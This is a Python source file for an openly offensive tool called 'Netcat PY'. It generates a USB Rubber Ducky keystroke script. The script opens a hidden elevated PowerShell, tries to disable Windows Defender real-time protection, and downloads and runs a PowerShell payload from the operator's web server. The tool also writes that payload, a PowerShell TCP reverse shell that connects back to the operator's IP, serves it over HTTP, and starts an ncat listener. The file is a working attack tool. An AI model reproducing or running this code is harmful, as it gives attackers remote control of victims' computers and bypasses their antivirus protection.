import os
import sys
import time
import socket
import getpass
import subprocess
import http.server
import socketserver
from requests import get
from pathlib import Path

#Settings
os.system('mode con: cols=52 lines=15')
sys.stdout.write("\x1b]2;Netcat PY\x07")

pcname = getpass.getuser() #gets the username of the pc
ipv4 = socket.gethostbyname(socket.gethostname())
hostip = get('http://myip.dnsomatic.com/').text #grabs your public ip from a website
my_file = Path("port.txt")
if my_file.is_file():
	file1 = open('port.txt', 'r') 
	lastport = file1.readline()
	print("file found setting port to last port")
	time.sleep(1)
	print("last port", lastport)
	listenport = lastport
	time.sleep(1)
else:
	listenport = "4444" #deafults the port to 4444
	file1 = open('port.txt', 'w') 
	file1.writelines(listenport) 
	file1.close() 

#main menu
def menu():
	os.system('cls')
	print("Welcome:", pcname)
	print("Host:", hostip)
	print("Port:", listenport)
	print("")
	print("1) Listen")
	print("")
	print("2) Settings")
	print("")
	print("0) Exit")


menu() #prints the main menu
menu1 = input("-->> ") #asks fo user input

while menu1 != "0":
	if menu1 == "1":
		PORT = 8000
		print("Creating Ducky script:")
		my_file = Path("payload.txt")
		if my_file.is_file():
			print("File already found.")
			print("Replacing file.")
			os.remove("payload.txt")
			duckyscript = open('payload.txt', 'w')
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("GUI r"+ "\n")
			duckyscript.writelines("DELAY 500"+ "\n")
			duckyscript.writelines("STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("LEFT"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("ALY y"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("GUI r"+ "\n")
			duckyscript.writelines("DELAY 100"+ "\n")
			mywebserver = hostip+':'+str(PORT)
			strga = '"IEX (New-Object Net.WebClient).DownloadString'
			strgaend = '("http://'+mywebserver+'/payload.ps1");"'
			script = strga+strgaend
			duckyscript.writelines("STRING powershell"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("STRING "+script+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("STRING exit"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.close() 
			time.sleep(2)
			print("Done :)")
		else:
			duckyscript = open('payload.txt', 'w')
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("GUI r"+ "\n")
			duckyscript.writelines("DELAY 500"+ "\n")
			duckyscript.writelines("STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("LEFT"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("ALY y"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("GUI r"+ "\n")
			duckyscript.writelines("DELAY 100"+ "\n")
			mywebserver = hostip+':'+str(PORT)
			strga = '"IEX (New-Object Net.WebClient).DownloadString'
			strgaend = '("http://'+mywebserver+'/payload.ps1");"'
			script = strga+strgaend
			duckyscript.writelines("STRING powershell"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("DELAY 1000"+ "\n")
			duckyscript.writelines("STRING "+script+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.writelines("STRING exit"+ "\n")
			duckyscript.writelines("ENTER"+ "\n")
			duckyscript.close() 
			time.sleep(2)
			print("Finnished making file")

		print("Creating Payload:")

		#Putting together payload.ps1 file
		startps1 = '$sm=(New-Object Net.Sockets.TCPClient("'
		ps1listen = hostip+'",'+listenport
		ps1missle = ')).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne '
		ps1end = '0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'
		payloadps1 = startps1+ps1listen+ps1missle+ps1end
		my_file = Path("payload.ps1")
		if my_file.is_file():
			print("File already found.")
			print("Replacing file.")
			os.remove("payload.ps1")
			ps1payload = open('payload.ps1', 'w')
			ps1payload.writelines(payloadps1)
			ps1payload.close()
		else:
			ps1payload = open('payload.ps1', 'w')
			ps1payload.writelines(payloadps1)
			ps1payload.close()

		print("Starting web server:")
		handler = http.server.SimpleHTTPRequestHandler
		with socketserver.TCPServer((ipv4, PORT), handler) as httpd:
			print("Server started at:", hostip+":"+str(PORT))
			print("Listining on", hostip+":"+listenport)
			command = "start ncat.exe -lp "+listenport #starts ncat /B runs in same window -lp is listen on port listenport
			process = subprocess.Popen(command, shell=True) #runs the command
			process.wait() #waits for process
			httpd.serve_forever()

	elif menu1 == "2":
		os.system('cls')
		print("Settings:")
		print("")
		print("1) Host:", hostip)
		print("2) Port:", listenport)
		print("Anything else) Back:")
		settingsmenu = input("-->> ")
		if settingsmenu == "1":
			hostip = input("Host: ") #allows the user to change there ip if needed
		elif settingsmenu == "2":
			listenport = int(input("Port: ")) #allows the user to change the port
			if listenport > 65535:
				print("You can have that as your port number.")
				print("(to high)")
				time.sleep(2)
				listenport = lastport
			elif listenport < 1:
				print("You can have that as your port number.")
				print("(to low)")
				time.sleep(2)
				listenport = lastport
			else:
				file1 = open('port.txt', 'w') 
				file1.writelines(str(listenport)) 
				file1.close()
			listenport = str(listenport)
		else:
			print("")

	menu() #prints the main menu
	menu1 = input("-->> ") #asks fo user input

print("Cya :)")
time.sleep(2)